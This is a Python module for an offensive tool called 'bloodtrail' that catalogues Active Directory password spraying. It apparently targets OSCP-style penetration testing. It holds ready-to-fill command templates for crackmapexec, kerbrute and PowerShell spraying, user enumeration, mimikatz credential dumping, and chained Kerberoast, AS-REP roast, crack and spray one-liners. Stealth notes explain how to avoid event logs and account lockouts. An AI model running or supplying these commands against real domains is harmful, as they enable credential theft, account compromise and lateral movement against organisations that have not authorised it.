"""
Password spray and user enumeration mappings for bloodtrail.

Spray techniques, user enumeration commands, and password list generation.
"""

from typing import Dict, List, Any, Optional

from .base import SprayTechniqueInfo


SPRAY_TECHNIQUES: Dict[str, SprayTechniqueInfo] = {
    "smb": SprayTechniqueInfo(
        name="SMB-Based Spray (crackmapexec/netexec)",
        description="Spray passwords using SMB authentication - validates creds AND checks admin access",
        command_templates={
            "single_password": "crackmapexec smb <DC_IP> -u <USER_FILE> -p '<PASSWORD>' -d <DOMAIN> --continue-on-success",
            "password_list": "crackmapexec smb <DC_IP> -u <USER_FILE> -p <PASSWORD_FILE> -d <DOMAIN> --continue-on-success --no-bruteforce",
            "single_user": "crackmapexec smb <DC_IP> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN>",
            "network_range": "crackmapexec smb <NETWORK_RANGE> -u <USER_FILE> -p '<PASSWORD>' -d <DOMAIN> --continue-on-success",
        },
        ports=[445],
        requirements=["SMB port 445 open", "Network access to targets"],
        noise_level="high",
        advantages="Shows admin access (Pwn3d!), validates creds + checks admin in one step",
        disadvantages="Very noisy (Event logs 4625), triggers lockouts, detected by EDR",
        oscp_relevance="high",
        best_for=["Identifying admin access", "Quick validation", "Wide network spray"],
    ),
    "kerberos": SprayTechniqueInfo(
        name="Kerberos TGT-Based Spray (kerbrute)",
        description="Spray passwords using Kerberos pre-authentication - stealthiest method",
        command_templates={
            "single_password": "kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> <USER_FILE> '<PASSWORD>'",
            "user_enum": "kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USER_FILE>",
            "bruteuser": "kerbrute bruteuser -d <DOMAIN> --dc <DC_IP> <PASSWORD_FILE> '<USERNAME>'",
        },
        ports=[88],
        requirements=["Kerberos port 88 reachable", "Valid user list"],
        noise_level="low",
        advantages="Fastest, stealthiest - only 2 UDP frames per attempt, pre-auth check avoids lockouts for invalid users",
        disadvantages="No admin check (just validates creds), requires valid userlist, Kerberos only",
        oscp_relevance="high",
        best_for=["Stealth operations", "Large user lists", "Initial access", "Strict lockout policies"],
    ),
    "ldap": SprayTechniqueInfo(
        name="LDAP/ADSI-Based Spray (PowerShell)",
        description="Spray passwords using LDAP bind - works on Windows without external tools",
        command_templates={
            "spray_ps1": "Invoke-DomainPasswordSpray -UserList users.txt -Password '<PASSWORD>' -Verbose",
            "spray_ps1_admin": "Invoke-DomainPasswordSpray -UserList users.txt -Password '<PASSWORD>' -Admin -Verbose",
            "manual_bind": "(New-Object DirectoryServices.DirectoryEntry('LDAP://<DC_IP>','<DOMAIN>\\<USERNAME>','<PASSWORD>')).distinguishedName",
        },
        ports=[389, 636],
        requirements=["LDAP port 389/636 open", "Windows environment (PowerShell)", "Domain-joined or runas"],
        noise_level="medium",
        advantages="Built into Windows - no external tools needed, uses native APIs, scriptable",
        disadvantages="Windows-only, slower than Kerberos, requires PowerShell access on target",
        oscp_relevance="medium",
        best_for=["Windows-only environments", "Living off the land", "When no tools can be transferred"],
    ),
}


# Templates for testing credentials across all discovered hosts
# Uses bash loops (<=20 IPs) or file-based input (>20 IPs)
ALL_TARGETS_PROTOCOLS: Dict[str, Dict[str, str]] = {
    "smb": {
        "port": "445",
        "description": "Shows Pwn3d! for local admin access",
        "loop_template": '''for IP in {ips}; do
    crackmapexec smb $IP -u {user_file} -p '{password}' -d {domain} --continue-on-success
done''',
        "file_template": "crackmapexec smb {targets_file} -u {user_file} -p '{password}' -d {domain} --continue-on-success",
    },
    "winrm": {
        "port": "5985",
        "description": "PS Remoting / Evil-WinRM targets",
        "loop_template": '''for IP in {ips}; do
    crackmapexec winrm $IP -u '{username}' -p '{password}' -d {domain}
done''',
        "file_template": "crackmapexec winrm {targets_file} -u '{username}' -p '{password}' -d {domain}",
    },
    "rdp": {
        "port": "3389",
        "description": "Remote Desktop access check",
        "loop_template": '''for IP in {ips}; do
    crackmapexec rdp $IP -u '{username}' -p '{password}' -d {domain}
done''',
        "file_template": "crackmapexec rdp {targets_file} -u '{username}' -p '{password}' -d {domain}",
    },
    "mssql": {
        "port": "1433",
        "description": "Database server access",
        "loop_template": '''for IP in {ips}; do
    crackmapexec mssql $IP -u '{username}' -p '{password}' -d {domain}
done''',
        "file_template": "crackmapexec mssql {targets_file} -u '{username}' -p '{password}' -d {domain}",
    },
}

# Threshold for switching from inline IPs to file-based input
ALL_TARGETS_IP_THRESHOLD = 20


# Spray scenarios for contextual recommendations
SPRAY_SCENARIOS: List[Dict[str, Any]] = [
    {
        "scenario": "Stealth required (avoid detection)",
        "recommendation": "kerberos",
        "reason": "Kerbrute doesn't generate Windows Event Logs for failed auth",
    },
    {
        "scenario": "Need to identify admin access",
        "recommendation": "smb",
        "reason": "CME shows (Pwn3d!) for admin access, validates + checks in one step",
    },
    {
        "scenario": "Large user list (1000+ users)",
        "recommendation": "kerberos",
        "reason": "Fastest option - only 2 UDP frames per attempt",
    },
    {
        "scenario": "Windows-only environment (no tool transfer)",
        "recommendation": "ldap",
        "reason": "Uses built-in PowerShell, no binary transfer needed",
    },
    {
        "scenario": "Strict lockout policy (threshold <= 3)",
        "recommendation": "kerberos",
        "reason": "Pre-auth check identifies invalid users without incrementing lockout counter",
    },
    {
        "scenario": "Need to spray entire subnet",
        "recommendation": "smb",
        "reason": "CME supports CIDR ranges, shows which hosts are accessible",
    },
]


# User enumeration commands (for generating user lists)
USER_ENUM_COMMANDS: Dict[str, Dict[str, Dict[str, str]]] = {
    "windows": {
        "local_users": {
            "cmd": "net user",
            "description": "List local users on current machine",
        },
        "domain_users": {
            "cmd": "net user /domain",
            "description": "List all domain users (requires domain access)",
        },
        "domain_users_to_file": {
            "cmd": "net user /domain > users.txt",
            "description": "Export domain users to file",
        },
        "powershell_ad": {
            "cmd": "Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > users.txt",
            "description": "PowerShell AD enumeration (requires RSAT)",
        },
        "ldap_query": {
            "cmd": "(New-Object DirectoryServices.DirectorySearcher('(&(objectClass=user)(objectCategory=person))')).FindAll() | ForEach-Object { $_.Properties['samaccountname'] } > users.txt",
            "description": "LDAP query without RSAT",
        },
        "net_group": {
            "cmd": 'net group "Domain Users" /domain',
            "description": "List Domain Users group members",
        },
    },
    "linux": {
        "kerbrute_enum": {
            "cmd": "kerbrute userenum -d <DOMAIN> --dc <DC_IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_users.txt && cut -d' ' -f8 valid_users.txt | cut -d'@' -f1 > users.txt",
            "description": "Enumerate valid users via Kerberos pre-auth",
        },
        "ldapsearch": {
            "cmd": "ldapsearch -x -H ldap://<DC_IP> -D '<DOMAIN>\\<USERNAME>' -w '<PASSWORD>' -b '<DOMAIN_DN>' '(objectClass=user)' sAMAccountName | grep sAMAccountName | cut -d' ' -f2 > users.txt",
            "description": "LDAP enumeration with credentials",
        },
        "crackmapexec_users": {
            "cmd": "crackmapexec smb <DC_IP> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --users | awk '{print $5}' | grep -v '\\[' > users.txt",
            "description": "CME user enumeration (authenticated)",
        },
        "bloodhound_export": {
            "cmd": "echo \"MATCH (u:User) WHERE u.name IS NOT NULL AND NOT u.name STARTS WITH 'NT AUTHORITY' RETURN u.samaccountname\" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/\"//g' | grep -v '^$' > users.txt",
            "description": "Export users from BloodHound Neo4j (clean output)",
        },
        "rpcclient": {
            "cmd": "rpcclient -U '<USERNAME>%<PASSWORD>' <DC_IP> -c 'enumdomusers' | grep -oP '\\[.*?\\]' | tr -d '[]' | cut -d' ' -f1 > users.txt",
            "description": "RPC user enumeration",
        },
        "enum4linux": {
            "cmd": "enum4linux -U <DC_IP> | grep 'user:' | cut -d':' -f2 | awk '{print $1}' > users.txt",
            "description": "enum4linux user enumeration (unauthenticated if allowed)",
        },
    },
}


# Password list generation commands
PASSWORD_LIST_COMMANDS: Dict[str, Dict[str, Dict[str, str]]] = {
    "linux": {
        "bloodhound_passwords": {
            "cmd": "echo \"MATCH (u:User) WHERE u.pwned = true UNWIND u.pwned_cred_values AS cred RETURN cred\" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/\"//g' | grep -v '^$' | sort -u > passwords.txt",
            "description": "Export pwned passwords from BloodHound Neo4j",
        },
        "bloodhound_user_pass": {
            "cmd": "echo \"MATCH (u:User) WHERE u.pwned = true AND 'password' IN u.pwned_cred_types WITH u, [i IN range(0, size(u.pwned_cred_types)-1) WHERE u.pwned_cred_types[i] = 'password' | u.pwned_cred_values[i]][0] AS pass WHERE pass IS NOT NULL RETURN u.samaccountname + ':' + pass\" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/\"//g' > user_pass.txt",
            "description": "Export user:password pairs from Neo4j",
        },
        "hashcat_potfile": {
            "cmd": "cat ~/.hashcat/hashcat.potfile | cut -d':' -f2 > passwords.txt",
            "description": "Extract cracked passwords from hashcat potfile",
        },
        "john_potfile": {
            "cmd": "cat ~/.john/john.pot | cut -d':' -f2 > passwords.txt",
            "description": "Extract cracked passwords from john potfile",
        },
        "cewl_wordlist": {
            "cmd": "cewl -d 2 -m 5 -w passwords.txt <TARGET_URL>",
            "description": "Generate wordlist from target website",
        },
        "mutation_rules": {
            "cmd": "hashcat --stdout -r /usr/share/hashcat/rules/best64.rule passwords.txt > mutated_passwords.txt",
            "description": "Apply mutation rules to existing password list",
        },
    },
    "windows": {
        "mimikatz_extract": {
            "cmd": 'mimikatz.exe "sekurlsa::logonpasswords" exit | findstr /i "Password :" > passwords.txt',
            "description": "Extract passwords from mimikatz output",
        },
    },
}


# Password list generation scenario recommendations
PASSWORD_LIST_SCENARIOS: List[Dict[str, str]] = [
    {
        "scenario": "Have pwned users in BloodHound",
        "method": "bloodhound_passwords",
        "reason": "Direct extraction of captured credentials from Neo4j",
    },
    {
        "scenario": "Need user:password pairs for spray",
        "method": "bloodhound_user_pass",
        "reason": "Export in format ready for credential stuffing",
    },
    {
        "scenario": "After cracking NTLM/Kerberos hashes",
        "method": "hashcat_potfile",
        "reason": "Extract successfully cracked passwords",
    },
    {
        "scenario": "Web application target",
        "method": "cewl_wordlist",
        "reason": "Organization-specific words from website content",
    },
    {
        "scenario": "Need password variations",
        "method": "mutation_rules",
        "reason": "Expand list with common patterns (l33t, seasons, years)",
    },
]


# Complete chained attack workflows (one-liners)
SPRAY_ONELINERS: List[Dict[str, str]] = [
    {
        "name": "Full Neo4j Spray (Stealth)",
        "description": "Export non-pwned users + passwords from Neo4j, spray with kerbrute",
        "cmd": 'echo "MATCH (u:User) WHERE (u.pwned IS NULL OR u.pwned = false) AND u.enabled = true AND u.name IS NOT NULL AND NOT u.name STARTS WITH \'NT AUTHORITY\' RETURN u.samaccountname" | cypher-shell -u neo4j -p \'<NEO4J_PASS>\' --format plain | tail -n +2 | sed \'s/"//g\' | grep -v \'^$\' > targets.txt && echo "MATCH (u:User) WHERE u.pwned = true UNWIND u.pwned_cred_values AS cred RETURN cred" | cypher-shell -u neo4j -p \'<NEO4J_PASS>\' --format plain | tail -n +2 | sed \'s/"//g\' | grep -v \'^$\' | sort -u > spray_passwords.txt && for p in $(cat spray_passwords.txt); do kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> targets.txt "$p"; sleep 1800; done',
    },
    {
        "name": "Neo4j Spray + Admin Check (CME)",
        "description": "Export from Neo4j, spray with CME to identify admin access (Pwn3d!)",
        "cmd": 'echo "MATCH (u:User) WHERE (u.pwned IS NULL OR u.pwned = false) AND u.enabled = true RETURN u.samaccountname" | cypher-shell -u neo4j -p \'<NEO4J_PASS>\' --format plain | tail -n +2 | sed \'s/"//g\' | grep -v \'^$\' > targets.txt && echo "MATCH (u:User) WHERE u.pwned = true UNWIND u.pwned_cred_values AS cred RETURN cred" | cypher-shell -u neo4j -p \'<NEO4J_PASS>\' --format plain | tail -n +2 | sed \'s/"//g\' | sort -u > spray_passwords.txt && crackmapexec smb <DC_IP> -u targets.txt -p spray_passwords.txt -d <DOMAIN> --continue-on-success --no-bruteforce',
    },
    {
        "name": "AS-REP Roast -> Crack -> Spray",
        "description": "Roast AS-REP users, crack hashes, spray cracked passwords",
        "cmd": "impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile asrep.txt <DOMAIN>/ && hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --show | cut -d':' -f2 >> spray_passwords.txt && crackmapexec smb <DC_IP> -u users.txt -p spray_passwords.txt -d <DOMAIN> --continue-on-success --no-bruteforce",
    },
    {
        "name": "Kerberoast -> Crack -> Spray",
        "description": "Kerberoast SPNs, crack TGS hashes, spray cracked passwords",
        "cmd": "impacket-GetUserSPNs -dc-ip <DC_IP> -request -outputfile kerberoast.txt '<DOMAIN>/<USERNAME>:<PASSWORD>' && hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --show | cut -d':' -f2 >> spray_passwords.txt && crackmapexec smb <DC_IP> -u users.txt -p spray_passwords.txt -d <DOMAIN> --continue-on-success --no-bruteforce",
    },
    {
        "name": "CeWL -> Mutate -> Spray",
        "description": "Generate wordlist from website, apply mutations, spray",
        "cmd": "cewl -d 2 -m 5 -w cewl_words.txt <TARGET_URL> && hashcat --stdout -r /usr/share/hashcat/rules/best64.rule cewl_words.txt | sort -u > spray_passwords.txt && kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt spray_passwords.txt",
    },
]


def get_spray_technique(method: str) -> Optional[SprayTechniqueInfo]:
    """Get spray technique info by method name."""
    return SPRAY_TECHNIQUES.get(method)


def get_all_spray_techniques() -> Dict[str, SprayTechniqueInfo]:
    """Get all spray techniques."""
    return SPRAY_TECHNIQUES


def get_spray_scenarios() -> List[Dict[str, Any]]:
    """Get spray scenario recommendations."""
    return SPRAY_SCENARIOS


def get_user_enum_commands(platform: str = "linux") -> Dict[str, Dict[str, str]]:
    """Get user enumeration commands for a platform."""
    return USER_ENUM_COMMANDS.get(platform, {})


def get_password_list_commands(platform: str = "linux") -> Dict[str, Dict[str, str]]:
    """Get password list generation commands for a platform."""
    return PASSWORD_LIST_COMMANDS.get(platform, {})


def get_password_list_scenarios() -> List[Dict[str, str]]:
    """Get password list generation scenario recommendations."""
    return PASSWORD_LIST_SCENARIOS


def get_spray_oneliners() -> List[Dict[str, str]]:
    """Get spray one-liner commands for complete attack workflows."""
    return SPRAY_ONELINERS
